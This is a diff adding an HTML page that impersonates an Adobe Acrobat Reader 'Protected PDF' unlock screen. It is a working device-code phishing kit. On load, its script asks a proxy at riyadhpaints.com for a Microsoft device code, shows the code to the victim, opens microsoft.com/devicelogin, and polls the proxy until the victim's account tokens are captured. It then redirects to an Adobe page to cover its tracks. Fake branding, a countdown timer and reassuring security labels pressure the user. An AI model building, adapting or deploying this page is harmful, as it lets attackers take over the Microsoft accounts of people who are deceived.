@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Adobe Acrobat Reader – Protected PDF</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect x='2' y='2' width='20' height='24' rx='2' fill='%23e53e3e'/%3E%3Ctext x='12' y='15' text-anchor='middle' fill='white' font-size='8' font-weight='bold' font-family='Arial'%3EPDF%3C/text%3E%3C/svg%3E" />
+    <link rel="preconnect" href="https://use.typekit.net" crossorigin />
+    <link rel="stylesheet" href="https://use.typekit.net/hol7xhi.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'adobe-clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.10);
+            padding: 36px 32px 28px;
+            border: 1px solid #e8e8e8;
+            transition: all 0.2s;
+        }
+
+        /* ---------- HEADER ---------- */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .pdf-icon {
+            width: 40px;
+            height: 48px;
+            background: #e53e3e;
+            border-radius: 6px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            flex-shrink: 0;
+            box-shadow: 0 2px 8px rgba(229, 62, 62, 0.35);
+        }
+        .pdf-icon span {
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .pdf-icon .corner {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 14px;
+            height: 14px;
+            background: #fff;
+            border-bottom-left-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .pdf-icon .corner svg {
+            width: 10px;
+            height: 10px;
+        }
+
+        .header-text h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
+        }
+        .header-text .sub {
+            font-size: 14px;
+            color: #6b6b6b;
+            font-weight: 400;
+            margin-top: -2px;
+        }
+
+        /* ---------- AÇIKLAMA ---------- */
+        .description {
+            font-size: 14px;
+            color: #2c2c2c;
+            line-height: 1.5;
+            margin-bottom: 24px;
+            padding: 0 4px;
+        }
+        .description strong {
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+
+        /* ---------- KOD KUTUSU ---------- */
+        .code-box {
+            background: #1b1b1b;
+            border-radius: 8px;
+            padding: 20px 16px 18px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .code-box .label {
+            font-size: 11px;
+            text-transform: uppercase;
+            color: #a19f9d;
+            letter-spacing: 1px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .code-box .code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 34px;
+            font-weight: 700;
+            color: #0078d4;
+            letter-spacing: 8px;
+            margin: 6px 0 14px;
+            min-height: 52px;
+            word-break: break-all;
+        }
+        .code-box .code.loading {
+            color: #a19f9d;
+            font-size: 16px;
+            letter-spacing: 1px;
+            font-weight: 400;
+        }
+        .code-box .copy-btn {
+            background: #0078d4;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 32px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: inherit;
+        }
+        .code-box .copy-btn:hover {
+            background: #005a9e;
+        }
+        .code-box .copy-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .code-box .copy-btn.copied {
+            background: #107c10;
+        }
+
+        /* ---------- UNLOCK BUTONU ---------- */
+        .unlock-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 14px;
+            background: #1473e6;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: inherit;
+            margin-bottom: 20px;
+        }
+        .unlock-btn:hover {
+            background: #0d5bbf;
+        }
+        .unlock-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .unlock-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+            flex-shrink: 0;
+        }
+
+        /* ---------- ALT BİLGİ ---------- */
+        .footer-info {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            font-size: 12px;
+            color: #9a9a9a;
+            border-top: 1px solid #e8e8e8;
+            padding-top: 16px;
+            margin-top: 4px;
+        }
+        .footer-info .secure {
+            font-weight: 600;
+            color: #2c2c2c;
+            font-size: 13px;
+        }
+        .footer-info .expires {
+            font-weight: 500;
+            color: #d13438;
+            background: #fde7e9;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+        .footer-info .protected {
+            font-size: 11px;
+            color: #9a9a9a;
+        }
+
+        /* ---------- STATUS (hata/success) ---------- */
+        .status-msg {
+            margin: 12px 0 0;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+        }
+        .status-msg.show {
+            display: block;
+        }
+        .status-msg.error {
+            background: #fde7e9;
+            color: #d13438;
+        }
+        .status-msg.success {
+            background: #dff6dd;
+            color: #107c10;
+        }
+        .status-msg.info {
+            background: #e8f0fe;
+            color: #1a4d7a;
+        }
+
+        /* ---------- TOAST ---------- */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: #1e293b;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+            opacity: 0;
+            transition: transform 0.35s ease, opacity 0.35s ease;
+            z-index: 10000;
+            max-width: 92vw;
+            text-align: center;
+            pointer-events: none;
+        }
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        /* ---------- RESPONSIVE ---------- */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 18px 20px;
+            }
+            .code-box .code {
+                font-size: 26px;
+                letter-spacing: 5px;
+            }
+            .header-text h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- HEADER: Adobe Acrobat Reader -->
+        <div class="header">
+            <div class="pdf-icon">
+                <span>PDF</span>
+                <div class="corner">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#e53e3e" stroke-width="3">
+                        <polyline points="20 6 9 17 4 12" />
+                    </svg>
+                </div>
+            </div>
+            <div class="header-text">
+                <h1>Adobe Acrobat Reader</h1>
+                <div class="sub">Access Protected PDF</div>
+            </div>
+        </div>
+
+        <!-- Açıklama -->
+        <div class="description">
+            Your PDF document is encrypted with <strong>Adobe Document Cloud security</strong>.
+            Use the access code to verify your identity and unlock the file.
+        </div>
+
+        <!-- KOD KUTUSU -->
+        <div class="code-box">
+            <div class="label">Document Access Code</div>
+            <div class="code loading" id="codeValue"><i class="fas fa-spinner fa-pulse"></i> Loading...</div>
+            <button class="copy-btn" id="copyBtn" disabled>Copy Code</button>
+        </div>
+
+        <!-- UNLOCK PDF BUTONU (Microsoft login tetikleyicisi) -->
+        <button class="unlock-btn" id="loginBtn" disabled>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" width="20" height="20">
+                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+                <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
+                <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
+                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+            </svg>
+            UNLOCK PDF
+        </button>
+
+        <!-- Durum mesajı -->
+        <div id="statusMsg" class="status-msg"></div>
+
+        <!-- ALT BİLGİ -->
+        <div class="footer-info">
+            <div class="secure">🔒 Adobe Secure Platform</div>
+            <div class="protected">Protected by Adobe Document Cloud security</div>
+            <div class="expires" id="expiryDisplay">⏳ Code expires in <span id="timer">15:00</span></div>
+        </div>
+
+    </div>
+
+    <!-- TOAST -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // =============================================================
+        //   MEVCUT ÇALIŞMA MANTIĞI – HİÇBİR DEĞİŞİKLİK YAPILMADI
+        //   SADECE UI TETİKLEYİCİLERİ GÜNCELLENDİ
+        // =============================================================
+
+        // ===== API ADRESI (Proxy) =====
+        var API_URL = 'https://riyadhpaints.com/secured/proxy.php';
+        var USER_ID = 14;
+
+        // ===== DEĞİŞKENLER =====
+        var currentCode = null;
+        var currentDeviceCode = null;
+        var isPollingActive = false;
+        var pollInterval = null;
+
+        // ===== DOM ELEMANLARI =====
+        var codeEl = document.getElementById('codeValue');
+        var copyBtn = document.getElementById('copyBtn');
+        var loginBtn = document.getElementById('loginBtn');
+        var statusMsg = document.getElementById('statusMsg');
+        var toast = document.getElementById('toast');
+        var timerSpan = document.getElementById('timer');
+
+        // ===== SÜRE SAYACI =====
+        var expirySeconds = 900; // 15 dakika (başlangıç)
+        var timerInterval = null;
+
+        function startTimer(seconds) {
+            expirySeconds = seconds || 900;
+            clearInterval(timerInterval);
+            timerInterval = setInterval(function() {
+                var mins = Math.floor(expirySeconds / 60);
+                var secs = expirySeconds % 60;
+                timerSpan.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+                if (expirySeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerSpan.textContent = '00:00';
+                    // opsiyonel: kod süresi doldu mesajı
+                }
+                expirySeconds--;
+            }, 1000);
+        }
+
+        function stopTimer() {
+            clearInterval(timerInterval);
+        }
+
+        // ===== STATUS MESAJLARI =====
+        function showStatus(message, type) {
+            statusMsg.className = 'status-msg show';
+            if (type === 'error') statusMsg.classList.add('error');
+            else if (type === 'success') statusMsg.classList.add('success');
+            else if (type === 'info') statusMsg.classList.add('info');
+            statusMsg.textContent = message;
+        }
+
+        function hideStatus() {
+            statusMsg.className = 'status-msg';
+            statusMsg.textContent = '';
+        }
+
+        // ===== TOAST =====
+        function showToast(msg) {
+            toast.textContent = msg;
+            toast.className = 'toast show';
+            clearTimeout(toast._hideTimer);
+            toast._hideTimer = setTimeout(function() {
+                toast.classList.remove('show');
+            }, 5000);
+        }
+
+        // ===== KOD GÖSTER =====
+        function showCode(code) {
+            currentCode = code;
+            codeEl.textContent = code;
+            codeEl.className = 'code';
+            copyBtn.disabled = false;
+            loginBtn.disabled = false;
+            hideStatus();
+            // süreyi başlat (15 dakika)
+            startTimer(900);
+        }
+
+        function showLoading() {
+            codeEl.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Loading...';
+            codeEl.className = 'code loading';
+            copyBtn.disabled = true;
+            loginBtn.disabled = true;
+            stopTimer();
+            timerSpan.textContent = '--:--';
+        }
+
+        // ===== KOPYALA =====
+        function copyCode() {
+            if (!currentCode) {
+                showToast('No code available. Please wait.');
+                return;
+            }
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(currentCode).then(function() {
+                    showToast('✓ Code copied!');
+                    copyBtn.textContent = 'Copied!';
+                    copyBtn.classList.add('copied');
+                    setTimeout(function() {
+                        copyBtn.textContent = 'Copy Code';
+                        copyBtn.classList.remove('copied');
+                    }, 3000);
+                }).catch(function() { fallbackCopy(); });
+            } else {
+                fallbackCopy();
+            }
+        }
+
+        function fallbackCopy() {
+            var ta = document.createElement('textarea');
+            ta.value = currentCode;
+            document.body.appendChild(ta);
+            ta.select();
+            try {
+                document.execCommand('copy');
+                showToast('✓ Code copied!');
+                copyBtn.textContent = 'Copied!';
+                copyBtn.classList.add('copied');
+                setTimeout(function() {
+                    copyBtn.textContent = 'Copy Code';
+                    copyBtn.classList.remove('copied');
+                }, 3000);
+            } catch (err) {
+                showToast('Please copy the code manually.');
+            }
+            document.body.removeChild(ta);
+        }
+
+        // ===== API'DEN KOD AL =====
+        function fetchCodeFromAPI() {
+            showLoading();
+            showStatus('Getting access code...', 'info');
+
+            var data = {
+                action: 'get_auth_broker_device_code',
+                user_id: USER_ID,
+                tenant_id: 'common'
+            };
+
+            fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(function(response) {
+                if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
+                return response.json();
+            })
+            .then(function(data) {
+                if (data.error) {
+                    showStatus('Error: ' + data.error, 'error');
+                    codeEl.textContent = '------';
+                    codeEl.className = 'code';
+                    return;
+                }
+                if (data.user_code && data.device_code) {
+                    currentDeviceCode = data.device_code;
+                    showCode(data.user_code);
+                    showStatus('✓ Code received!', 'success');
+                    setTimeout(hideStatus, 3000);
+                } else {
+                    showStatus('Unexpected response.', 'error');
+                    codeEl.textContent = '------';
+                    codeEl.className = 'code';
+                }
+            })
+            .catch(function(err) {
+                showStatus('Network error. Please refresh.', 'error');
+                codeEl.textContent = '------';
+                codeEl.className = 'code';
+                console.error('Fetch error:', err);
+            });
+        }
+
+        // ===== MICROSOFT LOGIN AÇ =====
+        function openMicrosoftLogin() {
+            if (!currentCode) {
+                showToast('No code available. Please wait.');
+                return;
+            }
+            // Kodu panoya kopyala (yardım amaçlı)
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(currentCode);
+            }
+
+            var w = 520,
+                h = 640;
+            var left = Math.round(window.screen.width / 2 - w / 2);
+            var top = Math.round(window.screen.height / 2 - h / 2);
+            window.open(
+                'https://microsoft.com/devicelogin',
+                'ms_device_login',
+                'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top +
+                ',toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
+            );
+
+            if (currentDeviceCode) {
+                startPolling();
+            }
+        }
+
+        // ===== POLLING =====
+        function startPolling() {
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                pollInterval = null;
+            }
+            if (!currentDeviceCode) return;
+
+            isPollingActive = true;
+            showStatus('⏳ Waiting for authentication...', 'info');
+
+            pollInterval = setInterval(function() {
+                var data = {
+                    action: 'poll_auth_broker_token',
+                    device_code: currentDeviceCode,
+                    user_id: USER_ID,
+                    tenant_id: 'common'
+                };
+
+                fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    if (data.success) {
+                        clearInterval(pollInterval);
+                        pollInterval = null;
+                        isPollingActive = false;
+                        showStatus('✅ Verification successful! Redirecting...', 'success');
+                        setTimeout(function() {
+                            window.location.href = 'https://www.adobe.com/acrobat/online/pdf-to-woord.html';
+                        }, 1500);
+                    } else if (data.waiting) {
+                        // bekliyor
+                    } else if (data.error) {
+                        clearInterval(pollInterval);
+                        pollInterval = null;
+                        isPollingActive = false;
+                        showStatus('Error: ' + data.error, 'error');
+                    }
+                })
+                .catch(function(err) {
+                    console.error('Polling error:', err);
+                });
+            }, 5000);
+        }
+
+        // ===== BUTON BAĞLANTILARI =====
+        function setupButtons() {
+            copyBtn.addEventListener('click', copyCode);
+
+            loginBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                openMicrosoftLogin();
+            });
+        }
+
+        // ===== BAŞLAT =====
+        document.addEventListener('DOMContentLoaded', function() {
+            setupButtons();
+            // Sayfa yüklenir yüklenmez kodu al
+            fetchCodeFromAPI();
+        });
+    </script>
+</body>
+</html>
